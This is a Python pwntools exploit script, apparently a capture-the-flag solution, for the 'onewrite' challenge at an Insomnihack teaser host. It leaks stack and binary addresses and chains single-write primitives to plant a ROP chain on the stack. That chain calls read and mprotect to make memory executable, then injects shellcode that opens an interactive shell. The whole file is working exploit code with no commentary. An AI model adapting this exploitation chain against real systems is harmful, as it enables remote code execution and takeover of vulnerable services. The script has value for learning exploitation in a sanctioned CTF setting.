#!/usr/bin/env python

from pwn import *

if (sys.argv[1] == "local"):
	r = process("./onewrite")
else:
	r = remote("onewrite.teaser.insomnihack.ch", 1337)

def pause(s="pause!"):
	time.sleep(0.1)
	# raw_input(s)

context.arch = "amd64"
	
r.recvuntil(" > ")
r.sendline("1")
stack = int(r.recvline().strip(),16)
log.info("stack: %s" % hex(stack))

r.recvuntil("address : ")
r.send(str(stack+0x18))
r.recvuntil("data : ")
r.send("\x04")
pause()
r.recvuntil(" > ")
r.sendline("2")
base_text = int(r.recvline().strip(),16) - 0x8A15
log.info("base_text: %s" % hex(base_text))

do_leak = base_text + 0x8A15
do_overwrite = base_text + 0x89C3
main = base_text + 0x8B04

r.recvuntil("address : ")
r.send(str(stack+0x18))  # overwrite leak ret_addr
r.recvuntil("data : ")
r.send("\x04")
pause()
#===============================================
def overwrite(where,what):
	log.info("overwrite at %#x value %#x" % (where, what))
	global stack
	r.recvuntil(" > ")
	
	r.send(p64(main))

	r.recvuntil("address : ")
	r.send(str(stack-0x8))	 #overwrite over ret_addr
	r.recvuntil("data : ")
	r.send(p64(main))

	r.recvuntil(" > ")
	r.send(p64(0x4242424242424242))

	r.recvuntil("address : ")
	r.send(str(stack-0x28))   #overwrite over ret_addr
	r.recvuntil("data : ")
	r.send(p64(do_overwrite))
	r.recvuntil("address : ")
	r.send(str(where))   
	r.recvuntil("data : ")
	r.send(p64(what))
	
	stack -= 0x28

#==============================================
_dl_make_stack_executable = base_text + 0x78190
__stack_prot = base_text + 0x2B0D50
_dl_pagesize = base_text + 0x2B2218
pop_rax = base_text + 0x460ac # pop rax ; ret
pop_rdx = base_text + 0x484c5 # pop rdx ; ret
pop_rsi = base_text + 0xd9f2 # pop rsi ; ret
pop_rdi = base_text + 0x84fa # pop rdi ; ret
mov_dword_rdx_rax = base_text + 0x3ec74 # mov dword ptr [rdx], eax ; ret
call_rsp = base_text + 0x5373d
read = base_text + 0x460F0
mprotect = base_text + 0x47070
ret = base_text + 0x8B0E
i = 8
curr_stack = stack
overwrite(curr_stack+i,pop_rdi); i+=8
overwrite(curr_stack+i,0); i+=8
overwrite(curr_stack+i,pop_rsi); i+=8
overwrite(curr_stack+i,curr_stack+0x48); i+=8
overwrite(curr_stack+i,pop_rdx); i+=8
overwrite(curr_stack+i,0x100); i+=8
overwrite(curr_stack+i,read); i+=8
overwrite(curr_stack+i,ret); i+=8

def back(curr_stack, address, value):
	r.recvuntil(" > ")
	r.send(p64(0x1234))
	r.recvuntil("address : ")
	r.send(str(address))	 #overwrite over ret_addr
	r.recvuntil("data : ")
	r.send(p64(value))

for i in xrange(stack+0x18, curr_stack-0x28, 0x28):
	# log.info("i: %#x" % i)
	back(curr_stack, i, ret)
	back(curr_stack, curr_stack-0x1000, ret)


back(curr_stack, curr_stack-(0x330-20*0x28), ret)
payload = p64(pop_rsi)
payload += p64(0xae000)
payload += p64(pop_rdx)
payload += p64(7)
payload += p64(pop_rdi)
payload += p64(base_text)
payload += p64(mprotect)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(base_text+0x500)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(read)
payload += p64(base_text+0x500)
r.sendline(payload)
time.sleep(2)
r.sendline(asm(shellcraft.amd64.linux.sh()))
r.interactive()
